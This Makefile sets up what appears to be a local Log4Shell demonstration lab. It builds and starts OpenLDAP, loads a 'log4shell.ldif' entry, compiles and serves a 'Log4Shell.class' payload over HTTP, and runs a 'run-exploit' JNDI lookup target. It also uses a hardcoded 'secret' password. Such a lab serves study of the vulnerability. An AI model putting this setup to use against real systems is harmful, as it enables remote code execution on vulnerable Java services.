FORCE:

openldap-2.6.0.tgz:
	wget https://www.openldap.org/software/download/OpenLDAP/openldap-release/openldap-2.6.0.tgz

openldap-2.6.0: openldap-2.6.0.tgz
	gunzip -c openldap-2.6.0.tgz | tar xvfB -
	cd openldap-2.6.0; ./configure; make depend; make

/usr/local/etc/openldap: openldap-2.6.0
	sudo su -c "cd openldap-2.6.0 && make install"

/usr/local/etc/slapd.d:
	sudo mkdir -p /usr/local/etc/slapd.d
	
customize-config: /usr/local/etc/openldap
	sudo su -c "sed -i 's/my-domain/example/g' /usr/local/etc/openldap/slapd.ldif"
	sudo su -c 'echo "" >> /usr/local/etc/openldap/slapd.ldif'
	sudo su -c 'echo "include: file:///usr/local/etc/openldap/schema/java.ldif" >> /usr/local/etc/openldap/slapd.ldif'

/usr/local/var/openldap-data:
	sudo mkdir -p /usr/local/var/openldap-data

.PHONY: start-slapd
start-slapd: /usr/local/var/openldap-data /usr/local/etc/slapd.d
	sudo su -c "/usr/local/sbin/slapadd -n 0 -F /usr/local/etc/slapd.d -l /usr/local/etc/openldap/slapd.ldif"
	sudo su -c "/usr/local/libexec/slapd -F /usr/local/etc/slapd.d"

.PHONY: add-log4shell-entry
add-log4shell-entry:
	/usr/local/bin/ldapadd -w secret -D "cn=Manager,dc=example,dc=com" -f ldap/log4shell.ldif

Log4Shell.class:
	javac Log4Shell.java

.PHONY: start-http-server
start-http-server: Log4Shell.class
	mkdir -p .log
	python3 -u -m http.server 8000 > .log/server.log 2>&1 &

target/classes:
	mvn clean compile

target/classes/%.class: $(shell find src -type f)
	mvn clean compile

run-exploit: target/classes $(shell find target/classes -type f)
	mvn exec:java -Dexec.mainClass="com.kelseymckenna.ldap.DoJndiLookup"

